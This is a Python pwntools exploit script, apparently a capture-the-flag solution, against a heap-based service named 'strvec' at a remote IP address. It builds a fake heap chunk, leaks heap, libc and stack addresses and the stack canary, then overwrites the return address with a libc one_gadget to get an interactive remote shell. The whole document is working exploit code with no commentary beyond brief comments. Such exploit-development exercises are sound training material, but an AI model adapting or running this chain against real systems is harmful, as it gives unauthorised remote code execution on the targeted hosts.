from pwn import *

# p = process('./strvec')
libc = ELF('./libc-2.31.so')
p = remote('168.119.108.148', 12010)

def set(idx, data = b'\x00'):
	p.sendlineafter(b'> ', b'2')
	p.sendlineafter(b'= ', str(idx).encode('utf-8'))
	p.sendlineafter(b'= ', bytes(data))

def get(idx):
	p.sendlineafter(b'> ', b'1')
	p.sendlineafter(b'= ', str(idx).encode('utf-8'))

# Create a fake chunk
name = p64(0) + b'\x31' + b'\x00'*5

p.recv()
p.sendline(name)

p.recv()
p.sendline(b'2147483647')

set(0, b'a'*8)
set(4)

get(0)

p.recvuntil(b'a'*8)

heap_leak = u64(p.recvline().strip().ljust(8, b'\x00'))
log.info('heap_leak: ' + hex(heap_leak))

heap_base = heap_leak - 0x2f0
log.info('heap_base: ' + hex(heap_base))

set(1)

count = 8

# Prepare to free a chunk into unsorted bin
for i in range(5, 35):
	if(i == count):
		count += 6
		continue
	set(i)

set(0)
set(3, p64(heap_base + 0x2d0) + p64(0x531))

set(0, p64(heap_base + 0x300))

get(5)

p.recvuntil(b'vec.get(idx) -> ')

libc_leak = u64(p.recvline().strip().ljust(8, b'\x00'))
log.info('libc_leak: ' + hex(libc_leak))

libc.address = libc_leak - 0x1ebbe0
log.info('libc_base: ' + hex(libc.address))

# Environ variable stores a stack address
environ = libc.sym['environ']
log.info('environ: ' + hex(environ))

one_gadget = libc.address + 0xe6c81
log.info('one_gadget: ' + hex(one_gadget))

set(35)

set(0, p64(environ))
set(3, p64(0) + p64(0x31))

get(11)

p.recvuntil(b'vec.get(idx) -> ')

stack_leak = u64(p.recvline().strip().ljust(8, b'\x00'))
log.info('stack_leak: ' + hex(stack_leak))

fake_chunk = stack_leak - 0x118

set(0, p64(stack_leak - 0x10f) + p64(fake_chunk) + p64(heap_base + 0x2a0))

get(3)

p.recvuntil(b'vec.get(idx) -> ')

canary = u64(b'\x00' + p.recvline().strip())
log.info('canary: ' + hex(canary))

set(4)
set(36, p64(0) + p64(canary) + p64(0) + p64(one_gadget)[:6])

# Reset the size by freeing the chunk
set(5)
set(0)

# Get shell!
p.recv()
p.sendline(b'3')

p.interactive()